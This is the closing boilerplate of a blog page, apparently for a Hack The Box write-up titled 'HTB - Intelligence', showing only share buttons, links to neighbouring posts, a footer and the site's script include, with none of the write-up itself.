    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><path d="M16 8a6 6 0 0 1 6 6v7h-4v-7a2 2 0 0 0-2-2 2 2 0 0 0-2 2v7h-4v-7a6 6 0 0 1 6-6z"></path><rect x="2" y="9" width="4" height="12"></rect><circle cx="4" cy="4" r="2"></circle></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://reddit.com/submit/?url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f&amp;resubmit=true&amp;title=HTB%20-%20Intelligence" target="_blank" rel="noopener" aria-label="" title="Share on reddit">
  <div class="resp-sharing-button resp-sharing-button--reddit resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M12 0A12 12 0 0 0 0 12a12 12 0 0 0 12 12 12 12 0 0 0 12-12A12 12 0 0 0 12 0zm5.01 4.744c.688 0 1.25.561 1.25 1.249a1.25 1.25 0 0 1-2.498.056l-2.597-.547-.8 3.747c1.824.07 3.48.632 4.674 1.488.308-.309.73-.491 1.207-.491.968 0 1.754.786 1.754 1.754 0 .716-.435 1.333-1.01 1.614a3.111 3.111 0 0 1 .042.52c0 2.694-3.13 4.87-7.004 4.87-3.874 0-7.004-2.176-7.004-4.87 0-.183.015-.366.043-.534A1.748 1.748 0 0 1 4.028 12c0-.968.786-1.754 1.754-1.754.463 0 .898.196 1.207.49 1.207-.883 2.878-1.43 4.744-1.487l.885-4.182a.342.342 0 0 1 .14-.197.35.35 0 0 1 .238-.042l2.906.617a1.214 1.214 0 0 1 1.108-.701zM9.25 12C8.561 12 8 12.562 8 13.25c0 .687.561 1.248 1.25 1.248.687 0 1.248-.561 1.248-1.249 0-.688-.561-1.249-1.249-1.249zm5.5 0c-.687 0-1.248.561-1.248 1.25 0 .687.561 1.248 1.249 1.248.688 0 1.249-.561 1.249-1.249 0-.687-.562-1.249-1.25-1.249zm-5.466 3.99a.327.327 0 0 0-.231.094.33.33 0 0 0 0 .463c.842.842 2.484.913 2.961.913.477 0 2.105-.056 2.961-.913a.361.361 0 0 0 .029-.463.33.33 0 0 0-.464 0c-.547.533-1.684.73-2.512.73-.828 0-1.979-.196-2.512-.73a.326.326 0 0 0-.232-.095z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://www.xing.com/app/user?op=share;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f;title=HTB%20-%20Intelligence" target="_blank" rel="noopener" aria-label="" title="Share on xing">
  <div class="resp-sharing-button resp-sharing-button--xing resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M18.188 0c-.517 0-.741.325-.927.66 0 0-7.455 13.224-7.702 13.657.015.024 4.919 9.023 4.919 9.023.17.308.436.66.967.66h3.454c.211 0 .375-.078.463-.22.089-.151.089-.346-.009-.536l-4.879-8.916c-.004-.006-.004-.016 0-.022L22.139.756c.095-.191.097-.387.006-.535C22.056.078 21.894 0 21.686 0h-3.498zM3.648 4.74c-.211 0-.385.074-.473.216-.09.149-.078.339.02.531l2.34 4.05c.004.01.004.016 0 .021L1.86 16.051c-.099.188-.093.381 0 .529.085.142.239.234.45.234h3.461c.518 0 .766-.348.945-.667l3.734-6.609-2.378-4.155c-.172-.315-.434-.659-.962-.659H3.648v.016z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="whatsapp://send?text=HTB%20-%20Intelligence%20https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f" target="_blank" rel="noopener" aria-label="" title="Share on whatsapp">
  <div class="resp-sharing-button resp-sharing-button--whatsapp resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
    <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none" stroke-width="1" stroke-linecap="round" stroke-linejoin="round"><path d="M17.472 14.382c-.297-.149-1.758-.867-2.03-.967-.273-.099-.471-.148-.67.15-.197.297-.767.966-.94 1.164-.173.199-.347.223-.644.075-.297-.15-1.255-.463-2.39-1.475-.883-.788-1.48-1.761-1.653-2.059-.173-.297-.018-.458.13-.606.134-.133.298-.347.446-.52.149-.174.198-.298.298-.497.099-.198.05-.371-.025-.52-.075-.149-.669-1.612-.916-2.207-.242-.579-.487-.5-.669-.51-.173-.008-.371-.01-.57-.01-.198 0-.52.074-.792.372-.272.297-1.04 1.016-1.04 2.479 0 1.462 1.065 2.875 1.213 3.074.149.198 2.096 3.2 5.077 4.487.709.306 1.262.489 1.694.625.712.227 1.36.195 1.871.118.571-.085 1.758-.719 2.006-1.413.248-.694.248-1.289.173-1.413-.074-.124-.272-.198-.57-.347m-5.421 7.403h-.004a9.87 9.87 0 01-5.031-1.378l-.361-.214-3.741.982.998-3.648-.235-.374a9.86 9.86 0 01-1.51-5.26c.001-5.45 4.436-9.884 9.888-9.884 2.64 0 5.122 1.03 6.988 2.898a9.825 9.825 0 012.893 6.994c-.003 5.45-4.437 9.884-9.885 9.884m8.413-18.297A11.815 11.815 0 0012.05 0C5.495 0 .16 5.335.157 11.892c0 2.096.547 4.142 1.588 5.945L.057 24l6.305-1.654a11.882 11.882 0 005.683 1.448h.005c6.554 0 11.89-5.335 11.893-11.893a11.821 11.821 0 00-3.48-8.413Z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://news.ycombinator.com/submitlink?u=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f&amp;t=HTB%20-%20Intelligence" target="_blank" rel="noopener" aria-label="" title="Share on hacker news">
  <div class="resp-sharing-button resp-sharing-button--hackernews resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
			<svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" stroke="none"><path d="M0 24V0h24v24H0zM6.951 5.896l4.112 7.708v5.064h1.583v-4.972l4.148-7.799h-1.749l-2.457 4.875c-.372.745-.688 1.434-.688 1.434s-.297-.708-.651-1.434L8.831 5.896h-1.88z"/></svg>
    </div>
  </div>
</a>


<a class="resp-sharing-button__link" href="https://telegram.me/share/url?text=HTB%20-%20Intelligence&amp;url=https%3a%2f%2f0xade1.github.io%2fdevdraft%2fposts%2f2021%2f10%2fhtb-intelligence%2f" target="_blank" rel="noopener" aria-label="" title="Share on telegram">
  <div class="resp-sharing-button resp-sharing-button--telegram resp-sharing-button--small"><div aria-hidden="true" class="resp-sharing-button__icon resp-sharing-button__icon--solid">
      <svg xmlns="http://www.w3.org/2000/svg" width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"><line x1="22" y1="2" x2="11" y2="13"></line><polygon points="22 2 15 22 11 13 2 9 22 2"></polygon></svg>
    </div>
  </div>
</a>

      </div>
          <hr />

    
      <div class="pagination">
        <div class="pagination__title">
          <span class="pagination__title-h"></span>
        </div>

        <div class="pagination__buttons">
          
            <a href="https://0xade1.github.io/devdraft/posts/2021/10/htb-driver/" class="button previous">
                <span class="button__icon">â†</span>
                <span class="button__text">HTB - Driver</span>
            </a>
          

          
            <a href="https://0xade1.github.io/devdraft/posts/2021/10/htb-seal/" class="button next">
                <span class="button__text">Htb Seal</span>
                <span class="button__icon">â†’</span>
            </a>
          
        </div>
      </div>
    

      <hr />

        










  </main>

            </div>

            
                <footer class="footer">
    <div class="footer__inner">
        <div class="footer__content">
            <span>&copy; 2023</span>
            
            <span><a href="https://0xade1.github.io/devdraft/posts/index.xml" target="_blank" title="rss"><svg xmlns="http://www.w3.org/2000/svg" width="18" height="18" viewBox="0 0 20 20" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" class="feather feather-rss"><path d="M4 11a9 9 0 0 1 9 9"></path><path d="M4 4a16 16 0 0 1 16 16"></path><circle cx="5" cy="19" r="1"></circle></svg></a></span>
        </div>
    </div>
    <div class="footer__inner">
        <div class="footer__content">
            <span>Powered by <a href="http://gohugo.io">Hugo</a></span>
            <span>Made with &#10084;</span>
          </div>
    </div>
</footer>

            
        </div>

        



<script type="text/javascript" src="https://0xade1.github.io/devdraft/bundle.min.7015b843bafc394b6094818242f153559f5ca94b331b9faaf6132652c59619aefe60ae36e1637f7ee14fd953892639f466c25095c36d42203a1c195313e93212.js" integrity="sha512-cBW4Q7r8OUtglIGCQvFTVZ9cqUszG5&#43;q9hMmUsWWGa7&#43;YK424WN/fuFP2VOJJjn0ZsJQlcNtQiA6HBlTE&#43;kyEg=="></script>



    </body>
</html>
